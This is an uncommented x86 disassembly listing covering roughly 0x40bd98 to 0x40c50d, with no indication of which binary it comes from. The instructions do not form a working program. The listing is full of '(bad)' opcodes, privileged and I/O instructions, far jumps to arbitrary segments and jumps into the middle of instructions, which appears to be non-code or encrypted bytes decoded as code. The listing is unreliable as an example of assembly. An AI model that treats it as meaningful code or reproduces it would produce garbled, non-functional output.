  40bd98:	mov    dl,0x9
  40bd9a:	xchg   ebp,eax
  40bd9b:	ror    ah,1
  40bd9d:	mul    BYTE PTR [esi-0x2f]
  40bda0:	out    0xea,eax
  40bda2:	adc    eax,0x428309ee
  40bda7:	idiv   BYTE PTR [esp+edx*8+0x1b]
  40bdab:	or     BYTE PTR [ecx-0x4ed7452d],dl
  40bdb1:	xchg   BYTE PTR [edi],dl
  40bdb3:	sbb    DWORD PTR [ebx-0x2f],eax
  40bdb6:	(bad)  
  40bdb7:	sub    edi,ebp
  40bdb9:	repz es ss jp 0x40bdf2
  40bdbe:	loopne 0x40bdf6
  40bdc0:	in     eax,0x1e
  40bdc2:	mov    bl,0x28
  40bdc4:	loopne 0x40bddc
  40bdc6:	pop    ebp
  40bdc7:	rcl    ebx,cl
  40bdc9:	mov    cl,0xa5
  40bdcb:	jne    0x40bda4
  40bdcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdce:	xor    ebp,DWORD PTR [ecx]
  40bdd0:	arpl   WORD PTR [ecx+0x10],dx
  40bdd3:	mov    ebx,0x517e1208
  40bdd8:	or     ecx,eax
  40bdda:	nop
  40bddb:	jo     0x40be23
  40bddd:	mov    esp,0xf0ba3d72
  40bde2:	adc    al,al
  40bde4:	push   0x87cbdc4
  40bde9:	or     cl,BYTE PTR [esi-0x3b]
  40bdec:	(bad)  
  40bded:	sub    edx,eax
  40bdef:	mov    ch,0xa1
  40bdf1:	dec    ecx
  40bdf2:	lock add ch,ah
  40bdf5:	lock fmul QWORD PTR [ecx-0x7f]
  40bdf9:	sbb    edi,edi
  40bdfb:	xchg   BYTE PTR [eax+0x31fb409a],bh
  40be01:	scas   al,BYTE PTR es:[edi]
  40be02:	xchg   BYTE PTR [ecx+0x457a8026],dh
  40be08:	and    eax,0xbd298bf1
  40be0d:	xor    bl,BYTE PTR [ecx+0x5422323c]
  40be13:	xchg   BYTE PTR [edx-0x6a3a7c86],cl
  40be19:	(bad)  
  40be1a:	sar    DWORD PTR [ebp+0x183ef193],1
  40be20:	fdiv   QWORD PTR ds:0xce0b055b
  40be26:	mov    WORD PTR [esi],?
  40be28:	cmp    eax,0xbeef86fa
  40be2d:	lahf   
  40be2e:	outs   dx,DWORD PTR ds:[esi]
  40be2f:	(bad)
  40be33:	sub    BYTE PTR [eax-0x39],cl
  40be36:	jmp    0xde62b618
  40be3b:	inc    ebp
  40be3c:	retf   
  40be3d:	ficom  WORD PTR ds:0x88f06375
  40be43:	idiv   dh
  40be45:	xor    BYTE PTR [ecx-0xc],al
  40be48:	repnz push ds
  40be4a:	retf   0x861b
  40be4d:	xchg   BYTE PTR gs:[ecx],bh
  40be50:	mov    al,ds:0xcdfc0a8d
  40be55:	mov    dh,0x59
  40be57:	push   esp
  40be58:	add    BYTE PTR [bx-0x67c6],0xd9
  40be5e:	stos   DWORD PTR es:[edi],eax
  40be5f:	cmp    al,0xb2
  40be61:	jl     0x40be31
  40be63:	mov    DWORD PTR ds:0x31118958,edx
  40be69:	and    al,0xa7
  40be6b:	cmp    DWORD PTR [ebx],ebp
  40be6d:	jae    0x40be75
  40be6f:	sub    esp,ebp
  40be71:	xchg   esi,eax
  40be72:	xlat   BYTE PTR ds:[ebx]
  40be73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be74:	mov    al,0xa0
  40be76:	mov    bh,0xb4
  40be78:	sub    eax,0xcf28d88f
  40be7d:	pop    es
  40be7e:	shr    BYTE PTR [ebp+0x29c0ea71],1
  40be84:	ror    BYTE PTR [edx-0x11],0xf5
  40be88:	punpckldq mm2,DWORD PTR [edx]
  40be8b:	loop   0x40be8c
  40be8d:	jo     0x40be47
  40be8f:	push   edi
  40be90:	lds    ebx,FWORD PTR ss:[ebx]
  40be93:	cmp    BYTE PTR [ebp-0x35],cl
  40be96:	fld    TBYTE PTR ds:0xdc4ffdf0
  40be9c:	pusha  
  40be9d:	push   esp
  40be9e:	pop    es
  40be9f:	or     BYTE PTR [ecx],dl
  40bea1:	hlt    
  40bea2:	xchg   DWORD PTR ds:0x48b69a4d,eax
  40bea8:	popf   
  40bea9:	cmc    
  40beaa:	outs   dx,BYTE PTR ds:[esi]
  40beab:	sub    BYTE PTR [edi+0x838add8],cl
  40beb1:	(bad)  
  40beb2:	pop    ecx
  40beb3:	push   edx
  40beb4:	mov    esp,0xf525d087
  40beb9:	icebp  
  40beba:	out    dx,al
  40bebb:	call   0x7882eca0
  40bec0:	and    dh,BYTE PTR [edi]
  40bec2:	mov    al,0xce
  40bec4:	add    bh,BYTE PTR [edx]
  40bec6:	fs daa 
  40bec8:	loope  0x40be54
  40beca:	jmp    0x40bec0
  40becc:	outs   dx,DWORD PTR ds:[esi]
  40becd:	mov    eax,0xf11cf986
  40bed2:	idiv   bh
  40bed4:	clc    
  40bed5:	inc    edx
  40bed6:	popa   
  40bed7:	leave  
  40bed8:	mov    ds:0xd489a9ba,al
  40bedd:	rcr    BYTE PTR [ebx-0x1d2b0ac9],cl
  40bee3:	sub    cl,ch
  40bee5:	mov    dl,BYTE PTR [eax+0x4c7f08b4]
  40beeb:	dec    ebx
  40beec:	inc    esp
  40beed:	aas    
  40beee:	sub    DWORD PTR [ecx+ecx*1+0x14cdfc86],ebp
  40bef5:	call   0xef84:0xf01d9ac7
  40befc:	test   al,0xba
  40befe:	cmp    ah,BYTE PTR [ecx-0x49]
  40bf01:	push   ds
  40bf02:	inc    esp
  40bf03:	jge    0x40bf44
  40bf05:	out    dx,al
  40bf06:	xchg   DWORD PTR [ebp+0x54],eax
  40bf09:	or     eax,0xc1a0480f
  40bf0e:	ds mov al,0xc1
  40bf11:	rol    DWORD PTR [esi-0x79150b9f],1
  40bf17:	pop    edx
  40bf18:	push   cs
  40bf19:	scas   al,BYTE PTR es:[edi]
  40bf1a:	jl     0x40bf8b
  40bf1c:	xchg   esp,eax
  40bf1d:	xlat   BYTE PTR ds:[ebx]
  40bf1e:	call   0xfca9:0xe91b0561
  40bf25:	idiv   esi
  40bf27:	shl    DWORD PTR [edi+0x1b3c3bce],1
  40bf2d:	sti    
  40bf2e:	push   ebp
  40bf2f:	jmp    0xf067:0x6860736b
  40bf36:	neg    bh
  40bf38:	nop
  40bf39:	(bad)  
  40bf3a:	aam    0x20
  40bf3c:	ret    
  40bf3d:	int3   
  40bf3e:	dec    dl
  40bf40:	cli    
  40bf41:	jo     0x40bf45
  40bf43:	jg     0x40bf59
  40bf45:	pop    ebx
  40bf46:	sub    al,dh
  40bf48:	not    DWORD PTR [ebp-0x5442d858]
  40bf4e:	cld    
  40bf4f:	adc    BYTE PTR [eax+esi*8],dl
  40bf52:	and    dl,BYTE PTR [edi+0x3e]
  40bf55:	call   0xc44f:0x3fb5f183
  40bf5c:	sbb    cl,dh
  40bf5e:	xchg   DWORD PTR [ebx],esi
  40bf60:	(bad)  
  40bf61:	loope  0x40bfcc
  40bf63:	inc    ebx
  40bf65:	push   ebx
  40bf66:	pop    es
  40bf67:	sub    BYTE PTR [ecx+0x16],bl
  40bf6a:	sub    esp,DWORD PTR [ecx+ecx*1+0x24d77444]
  40bf71:	sub    ecx,DWORD PTR [esi+0x4b]
  40bf74:	xchg   esp,eax
  40bf75:	icebp  
  40bf76:	rcr    BYTE PTR [ebx-0x1da03775],0xc3
  40bf7d:	repnz mov ebp,0xde015635
  40bf83:	mov    eax,ds:0xad886c90
  40bf88:	or     BYTE PTR ds:0xf04ae245,cl
  40bf8e:	push   es
  40bf8f:	push   es
  40bf90:	repnz dec ebp
  40bf92:	jmp    0xb5d1:0x4e2e5965
  40bf99:	(bad)  [eax-0x7c5ea88f]
  40bf9f:	jb     0x40bfc0
  40bfa1:	xchg   DWORD PTR [edx],eax
  40bfa3:	cdq    
  40bfa4:	neg    DWORD PTR [esi+0x3a]
  40bfa7:	jl     0x40c000
  40bfa9:	jb     0x40bf6d
  40bfab:	call   0x97a6:0x75391870
  40bfb2:	push   DWORD PTR [edi]
  40bfb4:	push   ss
  40bfb5:	jo     0x40bf6f
  40bfb7:	neg    DWORD PTR [ecx-0x4c]
  40bfba:	jae    0x40bfaa
  40bfbc:	js     0x40bfae
  40bfbe:	rcr    BYTE PTR [eax],cl
  40bfc0:	mov    eax,0x36d536e9
  40bfc5:	and    BYTE PTR [ebp-0x8],ch
  40bfc8:	(bad)  
  40bfc9:	(bad)  
  40bfca:	not    BYTE PTR ds:0x49e63abe
  40bfd0:	jb     0x40c00c
  40bfd2:	pop    es
  40bfd3:	or     DWORD PTR [ebx],0x25271a13
  40bfd9:	push   eax
  40bfda:	stc    
  40bfdb:	pop    esi
  40bfdc:	inc    ebp
  40bfdd:	add    BYTE PTR [ebp-0x7bf84ff0],dh
  40bfe3:	add    DWORD PTR [ecx],ebx
  40bfe5:	into   
  40bfe6:	mov    bh,0xda
  40bfe8:	(bad)  
  40bfe9:	or     BYTE PTR [edi],ah
  40bfeb:	sub    BYTE PTR ds:0x2628dee6,0x8e
  40bff2:	mov    ebx,0x285a06f6
  40bff7:	or     eax,DWORD PTR [eax-0x344ca2bb]
  40bffd:	mov    esp,DWORD PTR [esi+0x5a597bc3]
  40c003:	add    eax,0x297aaf0b
  40c008:	mov    dh,0x6b
  40c00a:	loop   0x40c077
  40c00c:	push   0xd6a2a649
  40c011:	inc    edi
  40c012:	xchg   ebp,ecx
  40c014:	xchg   ebp,eax
  40c015:	inc    ebp
  40c016:	and    bl,bl
  40c018:	or     eax,0xb22856c4
  40c01d:	mov    esi,0x5ab917bb
  40c022:	pop    ss
  40c023:	std    
  40c024:	pop    edi
  40c025:	pusha  
  40c026:	jmp    0xf4acc253
  40c02b:	dec    edi
  40c02c:	pop    ebx
  40c02d:	push   esi
  40c02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c02f:	sub    DWORD PTR [edi-0x22],ebx
  40c032:	add    BYTE PTR [ebp+0x2d8f7008],ah
  40c038:	inc    edi
  40c039:	jns    0x40c0ac
  40c03b:	cmc    
  40c03c:	cli    
  40c03d:	mov    WORD PTR [eax],cs
  40c03f:	ror    DWORD PTR [esi],0x42
  40c042:	cmc    
  40c043:	jae    0x40bfe5
  40c045:	adc    ch,BYTE PTR [edx-0x4aa76dca]
  40c04b:	fiadd  WORD PTR [ecx-0x62]
  40c04e:	xor    ebp,ecx
  40c050:	ja     0x40c042
  40c052:	push   es
  40c053:	imul   dh
  40c055:	xor    ecx,DWORD PTR [esp+edi*2-0x6aacce58]
  40c05c:	mov    ds:0x5accfcf1,al
  40c061:	imul   edx,DWORD PTR [edi-0x1d],0x76
  40c065:	mov    bh,0xf1
  40c067:	inc    esi
  40c068:	imul   DWORD PTR [ebp-0x32fbd29c]
  40c06e:	iret   
  40c06f:	(bad)  
  40c070:	ds icebp 
  40c072:	jb     0x40c0e6
  40c074:	xor    bl,BYTE PTR [ebp-0x15]
  40c077:	sub    al,0x1d
  40c079:	sub    DWORD PTR [eax-0x79e385dd],ecx
  40c07f:	inc    edi
  40c080:	adc    bh,BYTE PTR [edx-0x2a]
  40c083:	xor    BYTE PTR [edi-0x22],dl
  40c086:	cwde   
  40c087:	sub    cl,al
  40c089:	leave  
  40c08a:	ja     0x40c0d1
  40c08c:	mul    DWORD PTR [edi-0x650ef39b]
  40c092:	pusha  
  40c093:	cmp    DWORD PTR [ecx],0xfffffff1
  40c096:	nop
  40c097:	sub    al,0x8b
  40c099:	xchg   DWORD PTR [edx-0x6dfc3d62],ebx
  40c09f:	repnz cdq 
  40c0a1:	mov    BYTE PTR [edi+0xdbe8b7f],0x4b
  40c0a8:	test   BYTE PTR [edx],ch
  40c0aa:	cs cdq 
  40c0ac:	dec    edx
  40c0ad:	in     eax,dx
  40c0ae:	mov    ebx,0x3b0b7771
  40c0b3:	aas    
  40c0b4:	std    
  40c0b5:	jg     0x40c136
  40c0b7:	call   0xa1c7653d
  40c0bc:	jp     0x40c0bd
  40c0be:	sub    ah,BYTE PTR [edi-0x1d]
  40c0c1:	call   0x2a1312d3
  40c0c6:	xchg   DWORD PTR [ebp+edx*4+0x62],esi
  40c0ca:	lahf   
  40c0cb:	push   edi
  40c0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0cd:	fwait
  40c0ce:	xchg   DWORD PTR [edi-0x48],eax
  40c0d1:	aas    
  40c0d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0d3:	cld    
  40c0d4:	dec    ebx
  40c0d5:	fiadd  WORD PTR es:0x212cab1f
  40c0dc:	xchg   ebx,eax
  40c0dd:	xor    BYTE PTR [esi-0x57],dh
  40c0e0:	or     esi,ebx
  40c0e2:	cmc    
  40c0e3:	stos   BYTE PTR es:[edi],al
  40c0e4:	mov    ebp,0x9851014e
  40c0e9:	icebp  
  40c0ea:	test   dl,al
  40c0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ed:	xchg   ebx,eax
  40c0ee:	outs   dx,DWORD PTR ds:[esi]
  40c0ef:	mov    ebp,0x8e75a5ec
  40c0f4:	xor    al,0xf6
  40c0f6:	xchg   bh,ah
  40c0f8:	xchg   ecx,eax
  40c0f9:	or     al,0xa6
  40c0fb:	retf   
  40c0fc:	xchg   edi,eax
  40c0fd:	repnz inc edi
  40c0ff:	sub    ch,bl
  40c101:	jmp    0x4231:0x28092dc2
  40c108:	xlat   BYTE PTR ds:[ebx]
  40c109:	and    eax,0xf7e9dcd6
  40c10e:	sbb    DWORD PTR [esi],eax
  40c110:	and    esi,ebp
  40c112:	dec    esi
  40c113:	and    bh,dh
  40c115:	push   edi
  40c116:	dec    esi
  40c117:	cmp    eax,0xf306909b
  40c11c:	or     ecx,edx
  40c11e:	push   esp
  40c11f:	push   0x40b90af
  40c124:	stos   DWORD PTR es:[edi],eax
  40c125:	js     0x40c174
  40c127:	call   0x28e79975
  40c12c:	pusha  
  40c12d:	push   ss
  40c12e:	lea    ebp,[ebx-0x6984ff8]
  40c134:	cmc    
  40c135:	or     eax,DWORD PTR [eax+edi*1+0x38f0f1be]
  40c13c:	imul   edx,DWORD PTR [ebx-0x6727c6b],0x66a45f43
  40c146:	xchg   BYTE PTR [ebp-0x2b3ee1a8],dl
  40c14c:	ret    
  40c14d:	mov    ch,0xec
  40c14f:	sub    eax,0x9341e08c
  40c154:	test   al,0xe2
  40c156:	push   es
  40c157:	xchg   esp,eax
  40c158:	ffreep st(0)
  40c15a:	xchg   cl,bh
  40c15c:	cmp    eax,0xab4ba7fd
  40c161:	sub    al,0x9d
  40c163:	pusha  
  40c164:	xchg   DWORD PTR [edi],ebp
  40c166:	xchg   esp,eax
  40c167:	sub    DWORD PTR ds:0xce90913a,edi
  40c16d:	popa   
  40c16e:	fbld   TBYTE PTR [edi]
  40c170:	pop    eax
  40c171:	test   BYTE PTR [esi-0x4536ea3b],al
  40c177:	dec    DWORD PTR [ecx+0xacd2670]
  40c17d:	sub    ch,BYTE PTR [ecx-0x7a]
  40c180:	or     BYTE PTR [ebp+eax*1-0x33],dl
  40c184:	and    edx,DWORD PTR [ebp-0xf7b8b01]
  40c18a:	xor    al,0xb7
  40c18c:	gs ins DWORD PTR es:[edi],dx
  40c18e:	mov    al,ds:0xa90a862
  40c193:	data16 out dx,al
  40c195:	jbe    0x40c19e
  40c197:	push   esp
  40c198:	outs   dx,BYTE PTR ds:[esi]
  40c199:	out    0xfc,eax
  40c19b:	adc    eax,ecx
  40c19d:	inc    ebp
  40c19e:	dec    ecx
  40c19f:	push   esp
  40c1a0:	sub    edi,DWORD PTR [ecx-0x79]
  40c1a3:	push   0x976d6a09
  40c1a8:	xchg   edi,eax
  40c1a9:	mov    ds:0xcdc0d85a,eax
  40c1ae:	in     al,dx
  40c1af:	add    dh,BYTE PTR [ecx]
  40c1b1:	retf   
  40c1b2:	pop    ss
  40c1b3:	outs   dx,BYTE PTR ds:[esi]
  40c1b4:	repz add DWORD PTR [edx],eax
  40c1b7:	test   eax,0x258292d5
  40c1bc:	or     BYTE PTR [edx-0x19],ch
  40c1bf:	fidiv  DWORD PTR [esi-0x21]
  40c1c2:	mov    ds:0x58f045a2,al
  40c1c7:	hlt    
  40c1c8:	fstp   QWORD PTR [ebp+0x74]
  40c1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1cc:	stos   BYTE PTR es:[edi],al
  40c1cd:	mov    esi,0x52d83811
  40c1d2:	xchg   DWORD PTR [ebp+0x59],ecx
  40c1d5:	pusha  
  40c1d6:	mov    BYTE PTR [ebp+eiz*1+0x73281ef7],dl
  40c1dd:	test   ch,0xb5
  40c1e0:	sub    esi,eax
  40c1e2:	(bad)  
  40c1e3:	push   esi
  40c1e4:	or     al,dl
  40c1e6:	mov    ds:0xc93cd3de,al
  40c1eb:	hlt    
  40c1ec:	ja     0x40c24a
  40c1ee:	xor    ch,BYTE PTR [edx]
  40c1f0:	lods   al,BYTE PTR ds:[esi]
  40c1f1:	dec    edx
  40c1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f3:	pop    esi
  40c1f4:	push   ebx
  40c1f5:	out    0xe0,eax
  40c1f7:	xchg   ecx,eax
  40c1f8:	dec    ebx
  40c1f9:	jecxz  0x40c181
  40c1fb:	popa   
  40c1fc:	mov    bh,0xa9
  40c1fe:	in     eax,dx
  40c1ff:	lods   eax,DWORD PTR ds:[esi]
  40c200:	adc    eax,0x2d54bcdf
  40c205:	sahf   
  40c206:	xchg   cl,ah
  40c208:	pop    ds
  40c209:	adc    esi,esp
  40c20b:	test   eax,0x91e6a9e3
  40c210:	clc    
  40c211:	call   DWORD PTR [edx-0x30]
  40c214:	scas   al,BYTE PTR es:[edi]
  40c215:	jne    0x40c1cc
  40c217:	iret   
  40c218:	ins    BYTE PTR es:[edi],dx
  40c219:	js     0x40c1c4
  40c21b:	jmp    0x22c9164e
  40c220:	or     BYTE PTR [ebx+edx*4+0x20],ch
  40c224:	mov    es,WORD PTR [ebx+0x60]
  40c227:	hlt    
  40c228:	jno    0x40c254
  40c22a:	xchg   esi,eax
  40c22b:	and    ah,BYTE PTR [ecx]
  40c22d:	jo     0x40c2a2
  40c22f:	dec    edx
  40c230:	pop    es
  40c231:	xchg   edx,eax
  40c232:	daa    
  40c233:	mov    edx,0x3f9a1abb
  40c238:	xchg   edx,eax
  40c239:	push   edx
  40c23a:	repnz sub BYTE PTR [ebp-0x14],al
  40c23e:	dec    eax
  40c23f:	xchg   ebx,eax
  40c240:	add    eax,DWORD PTR [ebx]
  40c242:	das    
  40c243:	outs   dx,DWORD PTR ds:[esi]
  40c244:	js     0x40c1d7
  40c246:	inc    esi
  40c247:	jo     0x40c254
  40c249:	inc    eax
  40c24a:	imul   ebp,ecx,0xffffffb6
  40c24d:	ja     0x40c1e0
  40c24f:	loope  0x40c201
  40c251:	test   eax,0xb5076870
  40c256:	in     al,dx
  40c257:	ss jo  0x40c24a
  40c25a:	inc    BYTE PTR ds:0xd3535321
  40c260:	or     BYTE PTR [edx+eiz*8],dl
  40c263:	pop    ecx
  40c264:	call   esp
  40c266:	(bad)  
  40c268:	test   DWORD PTR [eax],eax
  40c26a:	imul   edi,ebx,0x2ae331bb
  40c270:	loop   0x40c2e5
  40c272:	sub    DWORD PTR [ebx+ecx*4+0x9b25630],ebx
  40c279:	pushf  
  40c27a:	sub    edi,eax
  40c27c:	xchg   ecx,eax
  40c27d:	repnz or DWORD PTR ds:0x5f3af0b2,0x54
  40c285:	dec    edi
  40c286:	scas   eax,DWORD PTR es:[edi]
  40c287:	mov    esp,0x3fcef802
  40c28c:	add    dh,BYTE PTR [ebx-0x5a27e279]
  40c292:	push   eax
  40c293:	sti    
  40c294:	xchg   edi,eax
  40c295:	mov    eax,ds:0xec6228ba
  40c29a:	jo     0x40c28b
  40c29c:	or     dh,dh
  40c29e:	dec    eax
  40c29f:	jge    0x40c31d
  40c2a1:	popf   
  40c2a2:	aaa    
  40c2a3:	jmp    0x40c313
  40c2a5:	icebp  
  40c2a6:	sbb    BYTE PTR [edi],dl
  40c2a8:	les    esp,FWORD PTR [ecx]
  40c2aa:	lock cld 
  40c2ac:	pop    ebx
  40c2ad:	mov    eax,0xfde7689d
  40c2b2:	xchg   DWORD PTR [edi-0x64],ebx
  40c2b5:	mov    dh,0xfa
  40c2b7:	jecxz  0x40c2de
  40c2b9:	adc    ah,BYTE PTR [ecx+0x26]
  40c2bc:	add    DWORD PTR [ecx+0x37],edx
  40c2bf:	cmp    bh,ch
  40c2c1:	or     al,0x3b
  40c2c3:	es cli 
  40c2c5:	fnstsw WORD PTR [edx-0x7ae249d7]
  40c2cb:	iret   
  40c2cc:	stc    
  40c2cd:	lldt   WORD PTR [ecx+0x28f9689b]
  40c2d4:	cld    
  40c2d5:	fistp  QWORD PTR [edx+0x5745886f]
  40c2db:	or     DWORD PTR [eax],ebx
  40c2dd:	jle    0x40c307
  40c2df:	shl    BYTE PTR [ebx],1
  40c2e1:	and    eax,0xf03850b8
  40c2e6:	test   al,0x21
  40c2e8:	jmp    0x1d70760d
  40c2ed:	rcr    BYTE PTR [esi+0xf],1
  40c2f0:	dec    ebx
  40c2f1:	lock cmp eax,DWORD PTR [esp+edi*1]
  40c2f5:	repz dec ebx
  40c2f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2f8:	and    eax,0x6028a205
  40c2fd:	mov    al,ds:0x987d4a81
  40c302:	mov    cl,0x43
  40c304:	pop    edi
  40c305:	sbb    ecx,0x2a
  40c308:	in     ax,0xf3
  40c30b:	mov    dh,0xc
  40c30d:	lock add BYTE PTR ss:[edi],0xb3
  40c312:	mov    dl,0x4a
  40c314:	lods   eax,DWORD PTR ds:[esi]
  40c315:	mov    BYTE PTR [ecx-0x5b],dh
  40c318:	xor    ebx,edx
  40c31a:	(bad)  
  40c31b:	stc    
  40c31c:	mov    BYTE PTR [ebp+0x24],bl
  40c31f:	xor    ah,al
  40c321:	repz push 0x20
  40c324:	pop    esi
  40c325:	jge    0x40c330
  40c327:	pop    es
  40c328:	pop    ss
  40c329:	pop    eax
  40c32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c32b:	pop    ecx
  40c32c:	imul   DWORD PTR [ebx+0x94f147c]
  40c332:	jne    0x40c2d4
  40c334:	popa   
  40c335:	(bad)  
  40c336:	push   esi
  40c337:	pop    DWORD PTR [ebp-0x7b2b754d]
  40c33d:	mov    eax,0x18a8e805
  40c342:	out    0xe7,eax
  40c344:	or     BYTE PTR [eax],bl
  40c346:	and    BYTE PTR [esi-0x5e],ah
  40c349:	mov    DWORD PTR [ebp-0x1b0ce183],eax
  40c34f:	(bad)  
  40c350:	and    DWORD PTR ds:[edx],0xf310d374
  40c357:	gs jno 0x40c330
  40c35a:	in     al,dx
  40c35b:	scas   al,BYTE PTR es:[edi]
  40c35c:	adc    BYTE PTR [edx],0x5e
  40c35f:	sub    DWORD PTR [ebx+0x5b527311],esi
  40c365:	mov    dl,0x89
  40c367:	daa    
  40c368:	lock xor BYTE PTR [eax],dl
  40c36b:	aaa    
  40c36c:	cmp    dh,BYTE PTR [eax]
  40c36e:	jbe    0x40c3bd
  40c370:	dec    ebp
  40c371:	aaa    
  40c372:	xchg   bl,bh
  40c374:	fist   DWORD PTR [eax+0xffd6b14]
  40c37a:	shr    BYTE PTR [eax],1
  40c37c:	mov    bl,0xd3
  40c37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c37f:	push   esi
  40c380:	cld    
  40c381:	or     al,0xb
  40c383:	(bad)  
  40c384:	in     al,dx
  40c385:	inc    eax
  40c386:	xchg   BYTE PTR [edi],dh
  40c388:	xor    dh,BYTE PTR [esi-0x49]
  40c38b:	mov    BYTE PTR [ebx-0x73],cl
  40c38e:	push   0x52a15228
  40c393:	call   0xf13a21a1
  40c398:	and    eax,0xae3204d6
  40c39d:	out    dx,al
  40c39e:	mov    eax,0x12833405
  40c3a3:	xchg   ebp,eax
  40c3a4:	or     DWORD PTR [edi+0x47],0xffffffe9
  40c3a8:	push   es
  40c3a9:	mov    eax,0xe7ffc382
  40c3ae:	out    0xcf,eax
  40c3b0:	or     DWORD PTR [ebp-0x37],esi
  40c3b3:	std    
  40c3b4:	mov    bh,ah
  40c3b6:	dec    eax
  40c3b7:	pushf  
  40c3b8:	lods   eax,DWORD PTR ds:[esi]
  40c3b9:	mov    esp,cs
  40c3bb:	mov    ah,0x5e
  40c3bd:	pop    edx
  40c3be:	xchg   ebx,ecx
  40c3c0:	repnz xor ch,bh
  40c3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3c4:	call   0x90704a3a
  40c3c9:	adc    dh,BYTE PTR [eax-0x4]
  40c3cc:	push   ebp
  40c3cd:	add    BYTE PTR [ebp+0x2a],dh
  40c3d0:	xchg   ebx,eax
  40c3d1:	xchg   esi,eax
  40c3d2:	push   esi
  40c3d3:	mov    eax,ds:0xcb48b1d2
  40c3d8:	and    esi,DWORD PTR [esi]
  40c3da:	int3   
  40c3db:	adc    edi,esi
  40c3dd:	leave  
  40c3de:	inc    ecx
  40c3df:	pop    eax
  40c3e0:	mov    WORD PTR ds:0x59752f7c,ss
  40c3e6:	or     BYTE PTR [ecx],ch
  40c3e8:	mov    dl,0x7e
  40c3ea:	scas   eax,DWORD PTR es:[edi]
  40c3eb:	push   eax
  40c3ec:	or     DWORD PTR [eax+0x17],eax
  40c3ef:	mov    bh,0x8f
  40c3f1:	adc    ebp,DWORD PTR [ebp-0x32]
  40c3f4:	popa   
  40c3f5:	icebp  
  40c3f6:	add    al,0xc4
  40c3f8:	fimul  DWORD PTR [ebx+0x162deed7]
  40c3fe:	mov    esi,0x87aa23c0
  40c403:	mov    bl,0x46
  40c405:	add    DWORD PTR [edx],eax
  40c407:	sti    
  40c408:	mov    eax,ds:0xad297f96
  40c40d:	dec    ecx
  40c40e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c40f:	xchg   DWORD PTR [esi],ecx
  40c411:	sahf   
  40c412:	rcl    DWORD PTR [ebp+0x76],1
  40c415:	jae    0x40c490
  40c417:	aaa    
  40c418:	jle    0x40c45a
  40c41a:	int    0x4e
  40c41c:	lock sbb esi,DWORD PTR [ebx+edi*2+0x361bd22b]
  40c424:	or     BYTE PTR [edi-0x5680a203],ch
  40c42a:	ss mov bh,al
  40c42d:	adc    ebx,DWORD PTR [edx-0x3cc22d73]
  40c433:	test   eax,0x81efc125
  40c438:	in     al,dx
  40c439:	icebp  
  40c43a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c43b:	ret    0x72ab
  40c43e:	add    BYTE PTR [esi-0x4a],0x94
  40c442:	xor    eax,0x5f680924
  40c447:	mov    esp,0x547ef2f9
  40c44c:	sti    
  40c44d:	xrelease xchg BYTE PTR [ecx+eax*4],cl
  40c451:	out    0x5a,al
  40c453:	and    esp,DWORD PTR [edi+0x29]
  40c456:	jmp    0x40c474
  40c458:	or     BYTE PTR [eax+eax*1],dl
  40c45b:	mov    al,0x17
  40c45d:	mov    al,0x8d
  40c45f:	jle    0x40c447
  40c461:	icebp  
  40c462:	jb     0x40c465
  40c464:	pop    ss
  40c465:	push   cs
  40c466:	push   esi
  40c467:	cld    
  40c468:	xor    DWORD PTR [ecx+0x77],ecx
  40c46b:	iret   
  40c46c:	mov    gs,WORD PTR [esi+eax*4+0x339bf8c3]
  40c473:	repnz dec edi
  40c475:	cmp    ecx,DWORD PTR [edi+0x29]
  40c478:	(bad)  
  40c47a:	mov    al,ds:0x2f4e13b1
  40c47f:	dec    ebp
  40c480:	cmc    
  40c481:	jb     0x40c43a
  40c483:	mov    esi,esi
  40c485:	faddp  st(6),st
  40c487:	sub    eax,0x20668a74
  40c48c:	push   es
  40c48d:	push   esp
  40c48e:	push   esp
  40c48f:	cld    
  40c490:	ins    DWORD PTR es:[edi],dx
  40c491:	(bad)  
  40c492:	mov    edx,0x87aa01c7
  40c497:	mov    ebp,0xad442008
  40c49c:	add    BYTE PTR [edi],dh
  40c49e:	in     al,dx
  40c49f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4a0:	fcomip st,st(1)
  40c4a2:	xor    ah,BYTE PTR ds:0xab5a2e
  40c4a8:	xor    eax,ebp
  40c4aa:	cmp    eax,0x53d608c5
  40c4af:	push   0xa5259963
  40c4b4:	(bad)  
  40c4b5:	add    BYTE PTR [edi+0x33],bl
  40c4b8:	xchg   DWORD PTR [ebp-0x3bb5d7da],edx
  40c4be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4bf:	ret    0xbe09
  40c4c2:	repz mov ds:0x71fbea5a,al
  40c4c8:	(bad)  
  40c4c9:	lock xor BYTE PTR [ecx+0x39],dl
  40c4cd:	retf   
  40c4ce:	cmp    DWORD PTR [ebx*1-0x6cfca370],esi
  40c4d5:	scas   al,BYTE PTR es:[edi]
  40c4d6:	xor    cl,0x3a
  40c4d9:	jo     0x40c486
  40c4db:	inc    esp
  40c4dc:	dec    esi
  40c4dd:	clc    
  40c4de:	call   0xf2aa56bd
  40c4e3:	mov    edi,0xd12ef085
  40c4e8:	mov    es,edi
  40c4ea:	jl     0x40c4b4
  40c4ec:	repz adc eax,0xf7473eef
  40c4f2:	nop
  40c4f3:	push   edx
  40c4f4:	retf   0x87aa
  40c4f7:	test   BYTE PTR [edi-0x5c],dl
  40c4fa:	bound  ecx,QWORD PTR [edx-0x2078fffa]
  40c500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c501:	push   esp
  40c502:	jp     0x40c552
  40c504:	lea    esi,[edx-0x722ed7cb]
  40c50a:	fsub   DWORD PTR [ecx+esi*8]
  40c50d:	jge    0x40c4cd
